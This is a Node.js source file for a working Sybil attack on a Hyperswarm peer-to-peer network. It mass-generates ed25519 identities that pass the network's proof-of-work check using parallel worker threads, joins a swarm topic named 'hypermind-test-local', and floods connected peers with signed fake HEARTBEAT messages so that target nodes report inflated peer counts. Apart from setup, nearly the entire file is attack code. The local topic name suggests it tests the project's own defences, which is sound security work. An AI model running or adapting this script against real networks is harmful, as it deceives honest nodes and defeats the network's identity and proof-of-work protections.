const Hyperswarm = require("hyperswarm");
const crypto = require("crypto");
const sodium = require("sodium-native");
const { Worker, isMainThread, parentPort, workerData } = require("worker_threads");
const os = require("os");

const TOPIC_NAME = "hypermind-test-local";
const TOPIC = crypto.createHash("sha256").update(TOPIC_NAME).digest();
const POW_PREFIX = "0000";
const HEARTBEAT_INTERVAL = 5000;

// --- WORKER THREAD LOGIC ---
if (!isMainThread) {
    const { count, workerId } = workerData;
    const identities = [];

    const hashOut = Buffer.alloc(sodium.crypto_hash_sha256_BYTES);

    for (let i = 0; i < count; i++) {
        const { publicKey, privateKey } = crypto.generateKeyPairSync("ed25519");
        
        // Export keys to buffers so they can be sent to the main thread
        const id = publicKey.export({ type: "spki", format: "der" }).toString("hex");
        const privateKeyBuffer = privateKey.export({ type: "pkcs8", format: "der" });

        let nonce = 0;
        while (true) {
            const input = Buffer.from(id + nonce);
            sodium.crypto_hash_sha256(hashOut, input);
            // Check first 2 bytes = 0x00 means first 4 hex chars are "0000"
            if (hashOut[0] === 0 && hashOut[1] === 0) break;
            nonce++;
        }

        identities.push({ 
            id, 
            privateKeyBuffer, // Sent as buffer
            nonce, 
            seq: 0 
        });

        // Report progress after each identity
        parentPort.postMessage({ type: 'progress', workerId, completed: i + 1, total: count });
    }

    parentPort.postMessage({ type: 'done', identities });
    process.exit(0);
}

// --- MAIN THREAD LOGIC ---

function signMessage(message, privateKey) {
    return crypto.sign(null, Buffer.from(message), privateKey).toString("hex");
}

function createHeartbeat(fakePeer) {
    fakePeer.seq++;
    const sig = signMessage(`seq:${fakePeer.seq}`, fakePeer.privateKey);

    return JSON.stringify({
        type: "HEARTBEAT",
        id: fakePeer.id,
        seq: fakePeer.seq,
        hops: 0,
        nonce: fakePeer.nonce,
        sig,
    }) + "\n";
}

class SybilAttacker {
    constructor(numBots = 100) {
        this.numBots = numBots;
        this.fakePeers = [];
        this.swarm = new Hyperswarm();
        this.connections = new Set();
        this.heartbeatIntervals = new Map();
    }

    async generateIdentitiesParallel() {
        const numCPUs = os.cpus().length;
        const botsPerWorker = Math.floor(this.numBots / numCPUs);
        const remainder = this.numBots % numCPUs;
        
        console.log(`Spawning ${numCPUs} worker threads for PoW/KeyGen...`);

        const workers = [];
        const workerProgress = new Map();
        let totalCompleted = 0;
        let lastPrintedPercent = -1;

        const printProgress = () => {
            const percent = Math.floor((totalCompleted / this.numBots) * 100);
            if (percent !== lastPrintedPercent) {
                lastPrintedPercent = percent;
                process.stdout.write(`\rGenerating identities: ${totalCompleted}/${this.numBots} (${percent}%)`);
            }
        };

        for (let i = 0; i < numCPUs; i++) {
            // Distribute the remainder among the first few workers
            const count = botsPerWorker + (i < remainder ? 1 : 0);
            if (count === 0) continue;

            const workerId = i;
            workerProgress.set(workerId, 0);

            workers.push(new Promise((resolve, reject) => {
                const worker = new Worker(__filename, {
                    workerData: { count, workerId }
                });

                worker.on('message', (msg) => {
                    if (msg.type === 'progress') {
                        const oldProgress = workerProgress.get(msg.workerId) || 0;
                        workerProgress.set(msg.workerId, msg.completed);
                        totalCompleted += (msg.completed - oldProgress);
                        printProgress();
                    } else if (msg.type === 'done') {
                        resolve(msg.identities);
                    }
                });
                worker.on('error', reject);
                worker.on('exit', (code) => {
                    if (code !== 0) reject(new Error(`Worker stopped with exit code ${code}`));
                });
            }));
        }

        const results = await Promise.all(workers);
        console.log(''); // New line after progress
        
        // Flatten results and rehydrate private keys
        this.fakePeers = results.flat().map(peer => ({
            ...peer,
            // Re-create KeyObject for efficient signing in main thread
            privateKey: crypto.createPrivateKey({
                key: peer.privateKeyBuffer,
                format: 'der',
                type: 'pkcs8'
            })
        }));
    }

    async start() {
        console.log(`Generating ${this.numBots} fake identities in parallel...`);
        const start = Date.now();
        
        await this.generateIdentitiesParallel();
        
        const duration = ((Date.now() - start) / 1000).toFixed(2);
        console.log(`Generated ${this.fakePeers.length} identities in ${duration}s.`);
        console.log("Connecting to swarm...");

        this.swarm.on("connection", (socket) => this.handleConnection(socket));

        const discovery = this.swarm.join(TOPIC);
        await discovery.flushed();

        console.log(`Connected to swarm. Maintaining ${this.numBots} peers`);
        console.log("Attack active. Check target nodes to see inflated count.");
        console.log("Press Ctrl+C to stop the attack.");
    }

    handleConnection(socket) {
        console.log(`New connection established (${this.connections.size + 1} total)`);
        this.connections.add(socket);

        socket.on("data", (data) => {
            // In a real attack, you might silence incoming data to save CPU
            // or process it if protocol requires response.
        });

        socket.on("close", () => {
            this.connections.delete(socket);
            console.log(`Connection closed (${this.connections.size} remaining)`);
        });

        socket.on("error", () => {
            this.connections.delete(socket);
        });

        this.startHeartbeatForConnection(socket);
    }

    startHeartbeatForConnection(socket) {
        const interval = setInterval(() => {
            if (socket.destroyed) {
                clearInterval(interval);
                return;
            }

            // Batch writes could be further optimized here
            for (const fakePeer of this.fakePeers) {
                try {
                    const heartbeat = createHeartbeat(fakePeer);
                    socket.write(heartbeat);
                } catch (e) {
                    // socket error handling
                }
            }
        }, HEARTBEAT_INTERVAL);

        this.heartbeatIntervals.set(socket, interval);
    }

    stop() {
        console.log("Stopping");

        for (const interval of this.heartbeatIntervals.values()) {
            clearInterval(interval);
        }

        for (const socket of this.connections) {
            socket.destroy();
        }

        this.swarm.destroy();
        console.log("stopped");
    }
}

const numBots = process.argv[2] ? parseInt(process.argv[2]) : 100;

console.log(`Starting Sybil with ${numBots} peers`);

const attacker = new SybilAttacker(numBots);

process.on("SIGINT", () => {
    attacker.stop();
    process.exit(0);
});

process.on("SIGTERM", () => {
    attacker.stop();
    process.exit(0);
});

attacker.start().catch(console.error);